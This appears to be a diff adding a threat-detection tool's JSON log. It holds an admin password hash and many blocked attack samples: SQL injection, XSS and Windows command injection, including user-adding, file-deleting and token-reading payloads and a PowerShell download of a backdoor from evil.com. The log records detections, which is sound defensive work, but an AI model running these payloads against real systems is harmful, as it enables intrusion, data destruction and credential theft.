@@ -1,0 +1,4458 @@
+{
+  "users": {
+    "admin": {
+      "username": "admin",
+      "password_hash": "393166b54f9ec646b6e8ec196beb0ed2:bf7ffa506b25e3f23c5b58993b6bacc55c5c00e918efc0fa41ef91637b65acb0",
+      "role": "admin",
+      "created_at": "2025-11-07T01:47:11.069788+00:00"
+    }
+  },
+  "threats": [
+    {
+      "id": "threat_1762480435_1",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:55.013224+00:00"
+    },
+    {
+      "id": "threat_1762480435_2",
+      "payload": "'; DROP TABLE users; --",
+      "result": {
+        "threat": true,
+        "confidence": 0.98,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.98,
+            "patterns": [
+              "'; drop table"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 98
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:55.575296+00:00"
+    },
+    {
+      "id": "threat_1762480436_3",
+      "payload": "' UNION SELECT * FROM passwords --",
+      "result": {
+        "threat": true,
+        "confidence": 0.85,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.85,
+            "patterns": [
+              "union select",
+              "select * from"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 85
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:56.121888+00:00"
+    },
+    {
+      "id": "threat_1762480436_4",
+      "payload": "admin'--",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.9,
+            "patterns": [
+              "admin'--"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:56.666509+00:00"
+    },
+    {
+      "id": "threat_1762480437_5",
+      "payload": "' OR 1=1 --",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or 1=1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:57.213683+00:00"
+    },
+    {
+      "id": "threat_1762480437_6",
+      "payload": "1' OR '1'='1' /*",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:57.757340+00:00"
+    },
+    {
+      "id": "threat_1762480438_7",
+      "payload": "<script>alert('XSS')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:58.856702+00:00"
+    },
+    {
+      "id": "threat_1762480439_8",
+      "payload": "javascript:alert('XSS')",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.9,
+            "patterns": [
+              "javascript:",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:53:59.450485+00:00"
+    },
+    {
+      "id": "threat_1762480440_9",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.9,
+            "patterns": [
+              "onerror=",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:00.035908+00:00"
+    },
+    {
+      "id": "threat_1762480440_10",
+      "payload": "<svg onload=alert('XSS')>",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.9,
+            "patterns": [
+              "alert(",
+              "<svg onload"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:00.583981+00:00"
+    },
+    {
+      "id": "threat_1762480441_11",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.9,
+            "patterns": [
+              "javascript:",
+              "alert(",
+              "<iframe"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:01.138905+00:00"
+    },
+    {
+      "id": "threat_1762480441_12",
+      "payload": "';alert('XSS');//",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.9,
+            "patterns": [
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:01.710242+00:00"
+    },
+    {
+      "id": "threat_1762480442_13",
+      "payload": "<body onload=alert('XSS')>",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.9,
+            "patterns": [
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:02.270891+00:00"
+    },
+    {
+      "id": "threat_1762480442_14",
+      "payload": "; dir",
+      "result": {
+        "threat": true,
+        "confidence": 0.85,
+        "type": "command_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.85,
+            "patterns": [
+              "; dir"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 85
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:02.828200+00:00"
+    },
+    {
+      "id": "threat_1762480443_15",
+      "payload": "&& whoami",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "command_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.9,
+            "patterns": [
+              "&& whoami"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:03.392303+00:00"
+    },
+    {
+      "id": "threat_1762480443_16",
+      "payload": "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "result": {
+        "threat": true,
+        "confidence": 0.8,
+        "type": "command_injection",
+        "severity": "high",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.8,
+            "patterns": [
+              "| type"
+            ],
+            "severity": "high"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 80
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:03.944133+00:00"
+    },
+    {
+      "id": "threat_1762480444_17",
+      "payload": "; net user hacker password123 /add",
+      "result": {
+        "threat": true,
+        "confidence": 0.8,
+        "type": "command_injection",
+        "severity": "high",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.8,
+            "patterns": [
+              "net user"
+            ],
+            "severity": "high"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 80
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:04.495299+00:00"
+    },
+    {
+      "id": "threat_1762480445_18",
+      "payload": "&& powershell -c Get-Process",
+      "result": {
+        "threat": true,
+        "confidence": 0.85,
+        "type": "command_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.85,
+            "patterns": [
+              "powershell"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 85
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:05.049133+00:00"
+    },
+    {
+      "id": "threat_1762480445_19",
+      "payload": "| cmd.exe /c dir",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "command_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.9,
+            "patterns": [
+              "cmd.exe"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:05.609854+00:00"
+    },
+    {
+      "id": "threat_1762480446_20",
+      "payload": "; del /f /q *.*",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "command_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "; del"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:06.178475+00:00"
+    },
+    {
+      "id": "threat_1762480483_21",
+      "payload": "'; EXEC xp_cmdshell('net user hacker pass123 /add'); --",
+      "result": {
+        "threat": true,
+        "confidence": 0.8,
+        "type": "command_injection",
+        "severity": "high",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.8,
+            "patterns": [
+              "net user"
+            ],
+            "severity": "high"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 80
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:43.894149+00:00"
+    },
+    {
+      "id": "threat_1762480483_22",
+      "payload": "' UNION SELECT password FROM users WHERE username='admin'--",
+      "result": {
+        "threat": true,
+        "confidence": 0.9,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.9,
+            "patterns": [
+              "union select",
+              "admin'--"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 90
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:43.980012+00:00"
+    },
+    {
+      "id": "threat_1762480484_23",
+      "payload": "<script>fetch('/api/stats',{headers:{'Authorization':'Bearer '+localStorage.getItem('authToken')}}).",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:44.071416+00:00"
+    },
+    {
+      "id": "threat_1762480484_24",
+      "payload": "; powershell -c \"Invoke-WebRequest -Uri http://evil.com/backdoor.exe -OutFile C:\\temp\\backdoor.exe; ",
+      "result": {
+        "threat": true,
+        "confidence": 0.85,
+        "type": "command_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "command_injection",
+            "confidence": 0.85,
+            "patterns": [
+              "powershell"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 85
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:54:44.232084+00:00"
+    },
+    {
+      "id": "threat_1762480546_25",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:46.426440+00:00"
+    },
+    {
+      "id": "threat_1762480546_26",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:46.499941+00:00"
+    },
+    {
+      "id": "threat_1762480547_27",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:47.223922+00:00"
+    },
+    {
+      "id": "threat_1762480547_28",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:47.285670+00:00"
+    },
+    {
+      "id": "threat_1762480548_29",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:48.116140+00:00"
+    },
+    {
+      "id": "threat_1762480548_30",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:48.169836+00:00"
+    },
+    {
+      "id": "threat_1762480548_31",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:48.982482+00:00"
+    },
+    {
+      "id": "threat_1762480549_32",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:49.035205+00:00"
+    },
+    {
+      "id": "threat_1762480549_33",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:49.963116+00:00"
+    },
+    {
+      "id": "threat_1762480550_34",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:50.030147+00:00"
+    },
+    {
+      "id": "threat_1762480550_35",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:50.967027+00:00"
+    },
+    {
+      "id": "threat_1762480551_36",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:51.031335+00:00"
+    },
+    {
+      "id": "threat_1762480552_37",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:52.294905+00:00"
+    },
+    {
+      "id": "threat_1762480552_38",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:52.368103+00:00"
+    },
+    {
+      "id": "threat_1762480553_39",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:53.788435+00:00"
+    },
+    {
+      "id": "threat_1762480553_40",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:53.854233+00:00"
+    },
+    {
+      "id": "threat_1762480555_41",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:55.139717+00:00"
+    },
+    {
+      "id": "threat_1762480555_42",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:55.200028+00:00"
+    },
+    {
+      "id": "threat_1762480556_43",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:56.564507+00:00"
+    },
+    {
+      "id": "threat_1762480556_44",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:56.618988+00:00"
+    },
+    {
+      "id": "threat_1762480558_45",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:58.051248+00:00"
+    },
+    {
+      "id": "threat_1762480558_46",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:58.108566+00:00"
+    },
+    {
+      "id": "threat_1762480559_47",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:59.723694+00:00"
+    },
+    {
+      "id": "threat_1762480559_48",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:55:59.809904+00:00"
+    },
+    {
+      "id": "threat_1762480561_49",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:01.647579+00:00"
+    },
+    {
+      "id": "threat_1762480561_50",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:01.718294+00:00"
+    },
+    {
+      "id": "threat_1762480563_51",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:03.837500+00:00"
+    },
+    {
+      "id": "threat_1762480563_52",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:03.905101+00:00"
+    },
+    {
+      "id": "threat_1762480566_53",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:06.074887+00:00"
+    },
+    {
+      "id": "threat_1762480566_54",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:06.153310+00:00"
+    },
+    {
+      "id": "threat_1762480568_55",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:08.391814+00:00"
+    },
+    {
+      "id": "threat_1762480568_56",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:08.480170+00:00"
+    },
+    {
+      "id": "threat_1762480570_57",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:10.704487+00:00"
+    },
+    {
+      "id": "threat_1762480570_58",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:10.780995+00:00"
+    },
+    {
+      "id": "threat_1762480573_59",
+      "payload": "admin' OR '1'='1",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "sql_injection",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "sql_injection",
+            "confidence": 0.95,
+            "patterns": [
+              "' or '1'='1"
+            ],
+            "severity": "critical"
+          }
+        ],
+        "blocked": true,
+        "risk_score": 95
+      },
+      "user": "admin",
+      "timestamp": "2025-11-07T01:56:13.145270+00:00"
+    },
+    {
+      "id": "threat_1762480573_60",
+      "payload": "<script>alert('test')</script>",
+      "result": {
+        "threat": true,
+        "confidence": 0.95,
+        "type": "xss",
+        "severity": "critical",
+        "threats_found": [
+          {
+            "type": "xss",
+            "confidence": 0.95,
+            "patterns": [
+              "<script>",
+              "alert("
+            ],
